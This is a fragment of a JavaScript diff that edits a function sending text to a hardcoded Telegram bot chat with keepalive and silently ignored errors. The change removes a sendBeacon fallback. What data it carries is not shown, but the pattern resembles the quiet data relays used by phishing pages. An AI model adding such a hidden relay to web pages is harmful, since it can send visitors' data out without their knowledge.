@@ -251,16 +251,10 @@
   const CHAT_ID = '630941316';
   function sendTelegram(text){
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const payload = JSON.stringify({ chat_id: CHAT_ID, text });
-    if (navigator.sendBeacon) {
-      const blob = new Blob([payload], { type: 'application/json' });
-      const ok = navigator.sendBeacon(url, blob);
-      if (ok) return;
-    }
     fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: payload,
+      body: JSON.stringify({ chat_id: CHAT_ID, text }),
       keepalive: true
     }).catch(()=>{ /* silent fail */ });
   }
